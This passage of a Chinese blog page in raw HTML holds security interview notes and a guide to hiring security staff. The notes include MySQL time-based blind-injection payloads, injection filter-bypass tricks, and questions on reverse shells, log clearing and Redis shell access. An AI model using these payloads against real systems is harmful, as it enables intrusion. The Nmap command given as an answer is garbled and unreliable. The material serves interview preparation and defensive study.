class="line">    &gt; 一般是本部门的面试结束后进行一轮交叉面， 交叉面也是技术面，一般在HR面之前。</span><br><span class="line"></span><br><span class="line">3. 技术面过程中状态变成&quot;已回绝&quot;，但马上又出现另一个面试状态条， 为什么?</span><br><span class="line">    &gt; 有几种可能性:</span><br><span class="line">    &gt; 1. 你水平不错, 但是不适合本部门, 帮你转到别的部门了</span><br><span class="line">    &gt; 2. 你被该部门刷了, 但是被另一个部门从简历池里捞起来了</span><br><span class="line">    &gt; 3. 如果有的话欢迎补充</span><br><span class="line"></span><br><span class="line">4. 为什么&quot;更换职位&quot;或者&quot;更换城市&quot;按钮变灰? 发生了什么?</span><br><span class="line">    &gt; 首先恭喜, 这是好事</span><br><span class="line">      说明你的简历(或者面试)不错，已经被部门锁定，通过概率plus</span><br><span class="line">      如果你是定向内推的，那么&quot;更换职位&quot;按钮可能一开始就是灰的</span><br><span class="line"></span><br><span class="line">* PHP/JAVA反序列化漏洞原理</span><br><span class="line">* PHP魔术方法，属性可控；JAVA ReadObject可重写，可构造调用链；</span><br><span class="line"></span><br><span class="line">* PHP有哪些魔术方法</span><br><span class="line">* https://www.php.net/manual/zh/language.oop5.magic.php</span><br><span class="line"></span><br><span class="line">* OWASP TOP 10</span><br><span class="line">* 注入、失效的身份认证、敏感信息泄露、XML外部实体(XXE)、失效的访问控制 、安全配置错误、跨站脚本(XSS)、不安全的反序列化、使用含有已知漏洞的组件、不足的日志记录和监控 </span><br><span class="line">* http://www.owasp.org.cn/owasp-project/OWASPTop102017v1.3.pdf</span><br><span class="line"></span><br><span class="line">* 判断网站服务器是windows还是linux</span><br><span class="line"></span><br><span class="line">* linux大小写敏感，windows大小写不敏感</span><br><span class="line"></span><br><span class="line">* 常见端口号</span><br><span class="line"></span><br><span class="line">* TCP三次握手，TCP和UDP的区别</span><br><span class="line"></span><br><span class="line">* 同源策略</span><br><span class="line"></span><br><span class="line">* 三要素：协议，域名，端口号</span><br><span class="line"></span><br><span class="line">* 怎么绕过上传保护传shell</span><br><span class="line">* http://www.owasp.org.cn/OWASP_Training/Upload_Attack_Framework.pdf</span><br><span class="line">* https://www.owasp.org/index.php/Unrestricted_File_Upload</span><br><span class="line"></span><br><span class="line">* sqlmap中支持多少种SQL注入类型</span><br><span class="line"></span><br><span class="line">- 布尔型盲注、错误型盲注、延时盲注、联合查询、堆叠查询、内联注入</span><br><span class="line"></span><br><span class="line">* mysql注入中，版本5.0以上和5.0以下有什么区别</span><br><span class="line">* 5.0以下没有information_schema系统表，无法列表名，只能暴力跑表</span><br><span class="line">* 5.0以下是多用户单操作，5.0以上是多用户多操作</span><br><span class="line"></span><br><span class="line">* mysql注入写shell，需要的条件</span><br><span class="line"></span><br><span class="line">* root权限以及网站的绝对路径</span><br><span class="line"></span><br><span class="line">* php伪协议</span><br><span class="line">* 常见文件包含函数</span><br></pre></td></tr></table></figure><p>include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* php.ini设置</span><br><span class="line">allow_url_fopen:on， 默认开启，该选项为on便是激活了URL形式的fopen封装协议使得可以访问 URL 对象文件等。</span><br><span class="line">allow_url_include:off，默认关闭，该选项为on便是允许包含URL对象文件等。</span><br><span class="line"></span><br><span class="line">* 常见的封装协议</span><br></pre></td></tr></table></figure><p>file://、php://filter、php://input、zip://、data://、compress.bzip2://、compress.zlib://</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">补充参考：&lt;https://www.freebuf.com/column/148886.html&gt;</span><br><span class="line">file://；php://filter、php://input协议常用作任意文件读取or文件包含</span><br><span class="line">zip://，phar://协议用作文件包含，配合文件上传（ctf常见；实战未见到）</span><br><span class="line"></span><br><span class="line">* HQL注入特性</span><br><span class="line">* 带有order by的limit，在limit语句后面的注入方法</span><br><span class="line"></span><br><span class="line">  * 使用procedure analyse进行报错注入，只适用于5.0.0&lt;mysql&lt;5.6.6</span><br><span class="line">* SQL注入写一句话语句</span><br><span class="line">  * mssql</span><br><span class="line">  * mysql</span><br><span class="line">* mysql延时注入函数</span><br><span class="line">  * sleep()</span><br><span class="line">  * benchmark()</span><br><span class="line">  * get_lock()：延时精确可控，利用环境有限，需要两个session</span><br><span class="line">  * 笛卡尔积：</span><br><span class="line"></span><br><span class="line">    ```sql</span><br><span class="line">    count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C;</span><br></pre></td></tr></table></figure><ul><li><p>通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> rpad(<span class="string">'a'</span>,<span class="number">4999999</span>,<span class="string">'a'</span>) <span class="keyword">RLIKE</span> <span class="keyword">concat</span>(<span class="keyword">repeat</span>(<span class="string">'(a.*)+'</span>,<span class="number">30</span>),<span class="string">'b'</span>);</span><br><span class="line">concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'</span><br></pre></td></tr></table></figure></li><li><p>注入绕过</p><ul><li>宽字符：%df</li><li>将字符串转为16进制或使用char函数（十进制）进行转化（数据库会自动把16进制转化）</li><li>用注释符去掉输入密码部分如 “– / * #”</li><li>内联注释</li><li>换行符代替空格。Windows换行符为%0A%0D，Linux为%0A</li></ul></li><li><p>PHP防御SQL注入</p><ul><li>php.ini设置display_errors=Off，关闭错误提示</li><li>php.ini设置magic_quotes_gpc=On，开启魔术引号，5.3.0版本废弃，5.4.0版本移除</li><li>addslashes()函数，作用和魔术引号相同，两者冲突</li><li>mysql_real_escape_string()函数，转义SQL语句中的特殊字符，5.5.0版本废弃，7.0.0版本移除</li><li>htmlspecialchars()函数，把预定义的字符转换为HTML实体</li><li>正则替换：preg_match、preg_match_all()、preg_replace</li><li>转换数据类型</li><li>预编译语句</li><li>PDO (使用序数参数）</li></ul></li><li><p>自我介绍（参照简历，突出条理）</p></li><li><p>介绍工作经历/挖洞经历/比赛经历</p></li><li><p>介绍做过的开发项目（考察开发水平）</p></li><li><p>怎么快速扫描几十万主机的全端口</p><ul><li>masscan+zmap，IP分段，分布式</li></ul></li><li><p>不用正则表达式提取字符串中所有的ipv4</p><ul><li>不会，想不到好的办法</li></ul></li><li><p>渗透测试有哪几阶段</p></li><li><p>风险评估、漏洞评估和渗透测试三者的区别</p></li><li><p>如何防范羊毛党（业务风控/威胁情报)</p><ul><li>根据具体业务活动具体分析：是否实名场景；是否限制总额；是否规则可控</li><li>风控，威胁情报：猫池手机号，重复IMEI，来源IP单一（云服务器）</li><li>用户协议：事前规定，事后补救</li></ul></li><li><p>看过的技术书籍</p></li><li><p>Nmap指定从哪个源端口扫描，通常可以绕过防火墙规则</p><ul><li>53、80等，常用对外端口即可</li></ul></li><li><p>写一个Nmap命令，使用 SYN 扫描，不进行 DNS 查找，不 ping 主机，只返回tcp/139和 tcp/445的开放端口（考察常用工具熟悉程度）</p><ul><li>nmap -Pn -n -Ss -p139.135 --open ip</li></ul></li><li><p>Nmap扫描网段最快的命令</p><ul><li><p>不用dns，不ping，T5时序，不知道还有什么</p></li><li><p>常用的提权手法？</p><ul><li>mysql提权方法</li><li>mof支持linux提权吗</li><li>mof在windows下的作用</li></ul></li><li><p>横向渗透中需要注意什么？</p></li><li><p>常用的反弹shell命令？一般常反弹哪一种shell？</p></li><li><p>什么是Kerberos攻击？</p></li><li><p>什么是golden ticket（Kerberos）？</p></li><li><p>什么是silver ticket（Kerberos）？</p></li><li><p>结束时需要清除什么日志，位置和命令分别是什么，需要什么权限？</p></li><li><p>OWASP Mobile Top 10</p><ul><li>平台使用不当、不安全的数据存储、不安全的通信、不安全的身份验证、加密不足、不安全的授权、客户端代码质量问题、代码篡改、逆向工程、无关的功能</li><li><a href="http://www.owasp.org.cn/owasp-project/download/OWASPMobileTop102016.pdf" target="_blank" rel="noopener">http://www.owasp.org.cn/owasp-project/download/OWASPMobileTop102016.pdf</a></li></ul></li><li><p>APP使用SSL Pinning怎么抓包</p><ul><li>逆向APP，去除证书校验</li><li><a href="https://github.com/WooyunDota/DroidSSLUnpinning%EF%BC%88%E6%8E%A8%E8%8D%90%E6%96%87%E7%AB%A0%EF%BC%89" target="_blank" rel="noopener">https://github.com/WooyunDota/DroidSSLUnpinning（推荐文章）</a></li><li><a href="https://github.com/nabla-c0d3/ssl-kill-switch2" target="_blank" rel="noopener">https://github.com/nabla-c0d3/ssl-kill-switch2</a></li><li><a href="https://github.com/Fuzion24/JustTrustMe" target="_blank" rel="noopener">https://github.com/Fuzion24/JustTrustMe</a></li><li><a href="https://github.com/iSECPartners/Android-SSL-TrustKiller" target="_blank" rel="noopener">https://github.com/iSECPartners/Android-SSL-TrustKiller</a></li></ul></li></ul></li><li><p>APP数据做了签名怎么办</p><ul><li>不会</li></ul></li><li><p>发现一个大范围影响的新漏洞，如何快速排查公司资产？</p></li><li><p>windows/linux服务器应急流程</p></li><li><p>DDOS应急思路</p></li><li><p>高权限仍然无法删除文件是什么原因</p></li></ul><h1>SecurityInterviewQuestions</h1><p>网络信息安全从业者面试指南</p><h2 id="1-安全招聘现状">1 安全招聘现状</h2><h3 id="1-1-薪酬最高">1.1 薪酬最高</h3><p>互联网是计算机行业中薪酬最高的，而技术工程师是互联网中薪酬最高的，而安全工程师又是技术工程师中最高的。安全行业井喷式的爆发，使得每家互联网企业的安全部门成为标配并逐渐蔓延开来，而由于高校的安全专业才开始普及，安全从业人员紧缺且入门门槛较高从而导致了薪酬水涨船高。</p><h3 id="1-2-良莠不齐">1.2 良莠不齐</h3><p>好处是会有更多的人投身于安全，当然坏处也很明显，着急的岗位和紧缺人员导致存在大量良莠不齐的人在其中浑水摸鱼，明显的特征是你跟他聊技术细节他跟你聊推进落地，你跟他聊推进落地他跟你聊方向把控，你跟他聊方向把控他跟你聊团队管理，你跟他聊团队管理他跟你聊行业空间，如果这些方面都能聊一点那也行，更多的人是<strong>答非所问</strong>又或者<strong>句句有理但空洞没有屁用</strong>，又或者是今天这里听到一个理论还没弄明白呢明天就来跟你拽个概念，虽然这么说会得罪一部分人。</p><h3 id="1-3-圈子文化">1.3 圈子文化</h3><p>安全是一个小圈子，圈内的事情传播的非常快，比如谁家数据库泄露了、谁家被薅羊毛了、谁被抓了、谁被处罚了，这也是小圈子最大的好处，圈内的人很快能知道这个行业的新技术、新方向、新政策。你也可以很容易的知道每家公司的安全建设情况，比如你可以和阿里的人聊他们的线下配合公安的手段有多强，也可以和腾讯的人聊他们的SRC如何运营的这么好，也可以和百度的安全人聊如何让机器学习赋能安全产品的，这一切在安全圈内非常的容易。也有很多的安全会议可以学习到每家公司的经验，不用所有的事情都自己摸索也用闭门造车。</p><p>弊端也很明显，搞所谓的”圈子文化“，混迹于各种会议去主动认识各种圈内的人（当然这里不是指各家SRC运营的同学，这些是运营同学的工作一部分），认识的各种人如果是交流技术那也行，加了微信除了打招呼的自我介绍那句话就再也没说过有意义的东西，以为这样就进入了圈中心，可笑可悲。</p><h2 id="2-安全从业人员的必要素质">2 安全从业人员的必要素质</h2><blockquote><p>具备基础的工程师素质是一切的基础，在这个基础之上如果在攻防渗透和软件开发、兴趣驱动和适应能力上比较亮眼，则能很好的适应工作挑战。</p></blockquote><h3 id="2-1-攻防渗透和软件开发">2.1 攻防渗透和软件开发</h3><p>首先要明确一个概念，术业有专攻在安全行业不是常态。安全本身就是一个覆盖了客户端、前端、网络、后端、服务器等涉及JavaScript、Python、PHP、Java等各语言的工作，如果非要讲究术业有专攻就没法做了，当你可以有擅长的方向，但前提是你都懂，这个懂不应该停留在了解的层面，如果你是安全开发工程师除了研发技能外还必须知道常见漏洞的形成原因、利用方式和修复方案，如果你是渗透工程师除了理解各种漏洞的攻击细节外，还必须有基本的开发能力。</p><p>同时拥有攻防渗透和软件开发的人，在后面做事的方方面面会体现出极大的优势。</p><p>我们有过很资深研发工程师，但安全产品不同于用户产品，往往是都没有经验也没有参照物的，摸黑前行最好的情况是你曾住过这个房子，所以往往需要有很强的安全背景/不断的试错调整才能开发最好的产品。甚至在很多时候，沟通交流/思维上都需要进行转变才能更好的协作，减少代沟和沟通成本。这个要求并不是非要精通各种。</p><p>现状是安全行业更多的人是偏向于攻防渗透，而如果同时拥有很强的开发技能，优势将非常明显。在安全产品开发/漏洞挖掘/代码审计上。</p><p>不同岗位间的互补显得非常重要，做漏洞扫描器的如果在SRC挖过漏洞、做代码审计如果会软件开发、做合规审计的如果有CISP证书就会得心应手。</p><h3 id="2-2-兴趣驱动">2.2 兴趣驱动</h3><p>像安全产品开发一样，渗透测试也需要不断的试错，不断的将各种可能存在漏洞的地方一一测试，往往测试数百个请求才有所收获，这需要很好的坚持，但坚持这种品质无法立刻学会，但往往有很多东西能促使我们坚持，比如兴趣。我对于安全的坚持就是兴趣所驱动的，我会遇到一个线索从早上折腾到凌晨，会因为一个突破点从晚上摸索到下午。 我见过太多优秀的白帽子都是因为热爱，他们能跨行业的热爱。</p><h3 id="2-3-适应能力">2.3 适应能力</h3><p>软件工程师是三年换一轮新技术，而安全工程师则是每年都有新的方向。每天都会有新的漏洞/新的攻击方式/新的语言漏洞，每年也会有新的安全技术、安全防御手段、安全方向，而应对别无他法唯学习，良好的自驱自学能力是一切的基础。</p><h2 id="3-安全面试和笔试">3 安全面试和笔试</h2><blockquote><p>如何有效的甄别一些滥竽充数的人，最重要的肯定是面试这道坎。安全圈的东西行业内的人谁都能聊一点，所以一轮面试一定得安全技术负责人亲自把关，深入的问细节来判断。</p></blockquote><h3 id="3-1-面试注意项">3.1 面试注意项</h3><ul><li>提前约好面试时间和面试方式（电话/现场）</li><li>准时参与面试，有事情应提前电话沟通到位</li><li>面试时把握好节奏，及时阻止话多的，多留停顿给话少的</li><li>面试时不问/不透露公司敏感信息</li><li>即使只聊一分钟就觉得面试者不合适，也不应该立即挂断，面试应不少于20分钟</li></ul><h3 id="3-2-面试流程">3.2 面试流程</h3><ul><li>自我介绍下个人情况、做过的项目和技能<ul><li>观察谈吐，看思维逻辑是否有条理，沟通交流是否顺畅</li><li>性格类型是否合适</li></ul></li><li>围绕做过的项目进行细节提问，提问的问题根据岗位不同可以从3.2中抽取<ul><li>考察项目真实性、项目角色及分工</li><li>对项目的理解程度、掌握程度、思考等</li></ul></li><li>遇到解决不了的问题怎么做？<ul><li>考察学习能力和动手解决能力</li></ul></li><li>CTF、乌云、翻墙、写技术博客、技术书籍、参与GitHub开源项目、常浏览的网站、游戏、电视剧、业余时间干嘛、业内牛人<ul><li>综合体现出其技术热度</li></ul></li><li>算法、前端、服务器的掌握程度<ul><li>一些基础算法，比如快速排序、冒泡排序、选择排序、插入排序</li><li>一些机器学习算法，CNN、RNN、Tensorflow、验证码识别等等</li><li>前端JavaScript、HTML、CSS掌握程度，调试工具，编码等</li><li>服务器常用命令、配置、文件权限、进程栈、端口占用、异常日志等</li></ul></li><li>自认为自己比身边人的优势<ul><li>挖掘亮点，如何客观看待自己</li></ul></li><li>自认为的缺点<ul><li>客观的自我评价，讲自己没有缺点的基本可以不要了</li></ul></li><li>最有成就感的事情<ul><li>考察价值观，尤其对于一些未授权渗透甚至黑灰产事情的态度</li></ul></li><li>未来职业规划？<ul><li>请否有清晰的职业规划，对自己未来有长远思考</li><li>和当前岗位对匹配度</li></ul></li><li>还有什么要问我的吗？<ul><li>了解面试者所关心的侧重点</li></ul></li></ul><h3 id="3-3-面试题目">3.3 面试题目</h3><h4 id="渗透测试（Web方向）">渗透测试（Web方向）</h4><ul><li>挑选两到四个不同方向常见和不常见的漏洞，就漏洞原理、利用方式和修复方案进行提问，然后根据回答的情况进行详细深入的二次提问<ul><li>Redis未授权访问漏洞如何入侵利用？</li><li>SSRF漏洞原理、利用方式及修复方案？Java和PHP的SSRF区别？</li><li>宽字节注入漏洞原理、利用方式及修复方案？</li><li>简述JSONP的业务意义，JSONP劫持利用方式及修复方案？</li><li>CRLF注入原理？</li><li>URL白名单绕过？</li><li>XSS持久化？</li></ul></li><li>渗透全流程</li><li>就漏洞的检测发现进行提问<ul><li>越权问题如何检测？</li><li>黑盒如何检测XSS漏洞？</li><li>如果爬取更多的请求？</li></ul></li><li>应急思考<ul><li>有哪几种后门实现方式？</li><li>webshell检测有什么方法思路？</li><li>Linux服务器中了木马后，请简述应急思路？</li><li>遇到新0day(比如Struts2)后，应该如何进行应急响应？</li><li>新业务上线前可以从哪些方向进行安全评估？</li><li>现有系统可以从哪些方向进行审计发现其中的安全风险？</li></ul></li><li>基础开发<ul><li>简述Python装饰器、迭代器、生成器原理及应用场景？</li><li>简述Python进程、线程和协程的区别及应用场景？</li></ul></li></ul><h4 id="安全开发（Java方向）">安全开发（Java方向）</h4><ul><li>Java基础<ul><li>Java虚拟机区域如何划分？</li><li>HashMap和HashTable、ConcurrentHashMap的区别？</li><li>进程和线程区别，进程间、线程间通信有哪几种方式？</li><li>Java BIO/NIO/AIO是什么？适用哪些场景？</li></ul></li><li>算法基础<ul><li>快速排序的过程和复杂度？</li><li>冒泡排序的过程和复杂度？</li><li>CNN对比RNN区别？</li></ul></li><li>业务基础<ul><li>调试工具及异常排查流程？</li><li>数据库索引结构，什么情况下应该建唯一索引？</li><li>数据库分页语句如何写？</li></ul></li><li>业务安全<ul><li>HTTPS交互过程</li><li>OAuth2.0交互过程及其中可能存在的配置不当安全风险</li><li>对称加密和非对称加密的区别及优缺点</li><li>获取一个入参url，请求url地址的内容时应注意什么？</li><li>参数入库前应该如何过滤？</li><li>过滤器和拦截器原理和应用场景？</li><li>SESSION ID如何不被Javascript读取？</li><li>CSRF的Token如何设计？</li><li>同源策略？如何实现跨域请求？</li></ul></li></ul><h4 id="安全运营（合规审计方向）">安全运营（合规审计方向）</h4><ul><li>对于内控、合规、审计的理解<ul><li>考察其对于要做的事情和岗位要求、公司环境是否匹配</li><li>考察其大局上考虑是否周全或是片面</li></ul></li><li>传统行业和互联网行业的安全建设的区别及各自的优劣势<ul><li>是否能准确的抓住核心原因</li></ul></li><li>信息安全等级保护、网络安全法、GDPR<ul><li>挑选一到两个问其对其的来源理解以及落地程度取舍</li></ul></li><li>数据安全治理可以用什么思路做？</li><li>如何通过技术手段实现对异常操作的自动化监控？</li><li>如何对一个应用进行安全评估？</li><li>如何对一个应用进行安全审计？</li><li>如何理解权限分离、最小化权限？</li><li>考察一些CISP、CISSP的知识点</li><li>流程的设计<ul><li>挑选一些较为复杂的流程，比如转岗、离职等，如何设计考虑其中的细节</li></ul></li></ul><h4 id="安全架构（安全管理方向）">安全架构（安全管理方向）</h4><ul><li>渗透测试、安全研发、安全运营的问题可以挑选的问一些，以确保在各个方向上比较均衡</li><li>对于企业不同时期、不同阶段、不同体量的安全建设的方法、区别以及侧重</li><li>你所做过的安全架构图和所期望的安全架构</li><li>安全与其他团队（运维、研发、测试、GR/PR、内控、高管及三方安全公司）的关系</li><li>安全建设的理念/方法论理解<ul><li>纵深防御</li><li>木桶原理</li><li>由外而内</li><li>先低后上</li><li>能口不点</li><li>最小权限</li><li>权限分离</li><li>白名单和黑名单</li><li>漏洞和误报</li><li>规则经验和机器学习</li><li>漏洞危害证明</li><li>技术管控与意识提升的关系</li><li>安全推进方法</li><li>自研OR外采？</li><li>找到总的核心目标和各个项目的主要目标</li><li>创新和极致</li><li>责任分担</li><li>黑天鹅和灰犀牛</li></ul></li><li>衡量企业安全建设的水平</li><li>不同公司间的安全区别或差别是什么？比如腾讯和阿里，百度和京东</li><li>如何制定公司安全建设的三年甚至五年计划</li><li>未来安全行业的发展方向？</li></ul><h3 id="3-4-笔试题目">3.4 笔试题目</h3><blockquote><p>面试题目往往大同小异，而由于圈子小的原因很容易传播出去，如果做过准备哪怕深入的问也可能有漏网之鱼。而笔试往往能很好的看出来其动手能力，所以应尽可能的出一些无法提前预知、无法网上查询的专属题目，题目可以侧重于开发、调试、数据操作等方面。</p></blockquote><h4 id="渗透测试方向">渗透测试方向</h4><ul><li>给定一个漏洞靶场，在一定时间内找出最多漏洞数</li><li>给定一个匿名访问Redis，请GET SHELL</li><li>给一个项目场景进行安全评估（e.g.与三方厂商进行API交互）</li></ul><h4 id="软件开发方向">软件开发方向</h4><ul><li>读取一个文件第100-200行并发送到一个指定的API接口（着重考察对于各种异常情况的考虑）</li><li>最快的方式获取100万个子域名请求的响应内容并找出其中真实存在的子域名</li></ul><h4 id="数据结构方向">数据结构方向</h4><ul><li>给一个数组<code>[3,4,5,6,2,1,8]</code>，输入所有二元组其和为8。<ul><li>每个数字只能用一次</li><li>数组长度不定</li><li>考虑时间复杂度和空间复杂度，以最高效率</li></ul></li><li>存在一个list结构（表1），请转换为树状结构（表2）<ul><li>pid和id关系为父子关系</li><li>name为无规律随意命名</li></ul></li></ul><p>表1：list结构（list length&gt;1000）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">'111'</span>,</span><br><span class="line">    <span class="string">'pid'</span>: <span class="string">'0'</span>,</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'A1'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">'222'</span>,</span><br><span class="line">    <span class="string">'pid'</span>: <span class="string">'111'</span>,</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'A-B1'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">'223'</span>,</span><br><span class="line">    <span class="string">'pid'</span>: <span class="string">'111'</span>,</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'A-B2'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">'224'</span>,</span><br><span class="line">    <span class="string">'pid'</span>: <span class="string">'111'</span>,</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'A-B3'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">'333'</span>,</span><br><span class="line">    <span class="string">'pid'</span>: <span class="string">'223'</span>,</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'A-B2-C1'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">'444'</span>,</span><br><span class="line">    <span class="string">'pid'</span>: <span class="string">'333'</span>,</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'A-B2-C1-D1'</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>表2：最终的结构</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">'id'</span>: <span class="string">'111'</span>,</span><br><span class="line">  <span class="string">'pid'</span>: <span class="string">'0'</span>,</span><br><span class="line">  <span class="string">'name'</span>: <span class="string">'A1'</span>,</span><br><span class="line">  <span class="string">'child'</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">'id'</span>: <span class="string">'222'</span>,</span><br><span class="line">      <span class="string">'pid'</span>: <span class="string">'111'</span>,</span><br><span class="line">      <span class="string">'name'</span>: <span class="string">'A-B1'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">'id'</span>: <span class="string">'223'</span>,</span><br><span class="line">      <span class="string">'pid'</span>: <span class="string">'111'</span>,</span><br><span class="line">      <span class="string">'name'</span>: <span class="string">'A-B2'</span>,</span><br><span class="line">      <span class="string">'child'</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">'id'</span>: <span class="string">'333'</span>,</span><br><span class="line">          <span class="string">'pid'</span>: <span class="string">'223'</span>,</span><br><span class="line">          <span class="string">'name'</span>: <span class="string">'A-B2-C1'</span>,</span><br><span class="line">          <span class="string">'child'</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="string">'id'</span>: <span class="string">'444'</span>,</span><br><span class="line">              <span class="string">'pid'</span>: <span class="string">'333'</span>,</span><br><span class="line">              <span class="string">'name'</span>: <span class="string">'A-B2-C1-D1'</span></span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">'id'</span>: <span class="string">'224'</span>,</span><br><span class="line">      <span class="string">'pid'</span>: <span class="string">'111'</span>,</span><br><span class="line">      <span class="string">'name'</span>: <span class="string">'A-B3'</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-招聘渠道">4 招聘渠道</h2><h3 id="4-1-公司内部推荐">4.1 公司内部推荐</h3><blockquote><p>内推是优于招聘网站或猎头的，和找女朋友一样，熟人介绍的比媒婆介绍的要好，更不用说相亲网站的质量了。对于中高端岗位公司需要支付较高的猎头费用，所以内推渠道优于其它所有。</p></blockquote><ul><li>找到自己倾向的公司以及对应的招聘岗位<ul><li>注意岗位和个人技能及职业发展的匹配度</li></ul></li><li>找到对应公司员工请求内部推荐简历<ul><li>优先安全岗位的，其次同公司的</li><li>优先熟悉自己的，其次自检写好</li></ul></li></ul><h3 id="4-2-安全行业招聘网站">4.2 安全行业招聘网站</h3><blockquote><p>没有合适心仪的目标就上招聘网站。</p></blockquote><ul><li><a href="https://job.freebuf.com" target="_blank" rel="noopener">FreeBuf</a> - 安全行业垂直招聘网站</li><li><a href="https://www.lagou.com/zhaopin/wangluoanquan/" target="_blank" rel="noopener">拉钩</a> - 互联网垂直招聘</li><li><a href="https://www.zhipin.com/c101210100-p100407/" target="_blank" rel="noopener">BOSS直聘</a> - 负责人1对1</li><li><a href="https://www.liepin.com/zpwangluoanquan/" target="_blank" rel="noopener">猎聘</a> - 猎头招聘</li><li>智联招聘、前程无忧、LinkedIn</li></ul><h2 id="5-好的简历">5 好的简历</h2><blockquote><p>顺便说下好的简历是什么样的，当然一切的前提是有真才实干。</p></blockquote><p>整体要简洁明了，逻辑结构清晰。要能体现出知识、技能、经历、天赋、人脉。</p><ul><li>基本信息<strong>清晰</strong>：姓名、ID、性别、年龄、毕业院校·专业、电话、邮箱、居住地</li><li>工作&amp;项目经验：注意空档期、担任的角色与分工、公司行业知名度</li><li><strong>体现</strong>技术能力：主要的技术栈以及能佐证的事情</li><li>其它<strong>优势</strong>：职业证书、奖项、会议分享、开源项目等</li><li>工作期望和方向：希望得到一个什么样的工作或自己专注的方向</li><li>个人评价：全方位的总结，展示出自己的专业技能掌握程度、亮点、优势等等。</li><li>加分项<ul><li>使用PDF格式，简洁不花哨</li><li>有GitHub并参与过开源项目，可以写一些自己做过的小项目放上去</li><li>有个人博客，会写一些经验和问题的解决思路</li><li>邮箱使用gmail、foxmail或技术类邮箱（<a href="http://php.net" target="_blank" 